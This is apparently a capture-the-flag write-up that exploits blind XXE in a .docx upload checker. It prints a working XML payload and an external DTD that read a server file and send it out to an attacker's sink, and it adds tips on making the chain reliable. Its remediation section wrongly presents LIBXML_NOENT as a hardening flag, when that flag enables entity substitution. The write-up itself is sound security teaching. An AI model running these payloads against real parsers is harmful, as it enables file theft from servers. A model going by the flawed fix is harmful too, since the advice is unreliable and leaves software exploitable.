---
title: "XXE (medium) — out-of-band exfiltration"
category: Web
host: xxe-medium.is-course.ru
tags: [xxe, oob, docx, dtd]
technique: "external DTD, OOB exfiltration through a second request"
status: solved
---

# XXE — out-of-band

## Recon
The "vegan.docx checker" unzips an uploaded OOXML file and parses `word/document.xml` with an XML
parser that resolves external entities (libxml defaults, no `LIBXML_NOENT` hardening). The response
never echoes parsed content, so classic in-band XXE is blind — we need OOB.

## Exploit
1. Craft `evil.docx` whose `word/document.xml` contains:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY % remote SYSTEM "https://<sink>/evil.dtd"> %remote; %all; ]>
<r>&exfil;</r>
```

2. `evil.dtd` on our own HTTP sink:

```
<!ENTITY % file SYSTEM "file:///proc/self/cwd/flag.txt">
<!ENTITY % all "<!ENTITY exfil SYSTEM 'https://<sink>/?d=%file;'>">
```

3. The parser fetches the DTD (we see the request), substitutes `%file;` and issues the second request
   with the file contents in the query string.

`/proc/self/cwd/flag.txt` is the reliable path: the flag file is not at a fixed absolute location, but
the process CWD is the app directory.

Flag: `YDS{…redacted…}`

## Re-testing notes (2026-11-21)

The solve above is the one that produced the flag (external DTD on `paste.rs`, two requests: the DTD
fetch and the exfiltration fetch). When re-running it against a different sink (an ntfy topic) we could
reproduce only part of the chain, and the negative detail is worth knowing:

* **External general entities are fetched.** A minimal payload
  `<!ENTITY g SYSTEM "https://ntfy.sh/TOPIC/trigger?general=yes">` referenced as `&g;` produced a
  request at the sink — so the parser does resolve external entities.
* **The parameter-entity DTD chain is fragile.** With the DTD served from GitHub Pages, the parser
  intermittently returned `word/document.xml could not be parsed` instead of exfiltrating. Two mundane
  causes cost us time and are easy to hit:
  1. a literal `%%` left in the payload (an unformatted string) makes the subsituted `DOCTYPE` invalid;
  2. a DTD that declares `%exfil;` but never *invokes* it produces exactly zero requests.
* **The flag itself is not URL-safe.** Its braces (`{`, `}`) are outside RFC 3986's path/query
  character set, and a strict URI parser rejects the whole exfiltration entity — hence "could not be
  parsed" rather than a beacon. A sink that logs raw request lines (or a `file://` overlay) sidesteps
  this; ntfy requires a well-formed URL.

Practical takeaway: test the beacon with a *safe* file (`file:///etc/hostname`) before blaming the
parser, and remember that OOB XXE fails silently at three different stages — DTD fetch, entity
expansion, and URI serialisation.

## Fix
Disable external entity resolution (`LIBXML_NOENT`/`XML_PARSE_NONET`), or parse with a hardened
parser (e.g. Go's `encoding/xml` with `Strict` and no DTD support).
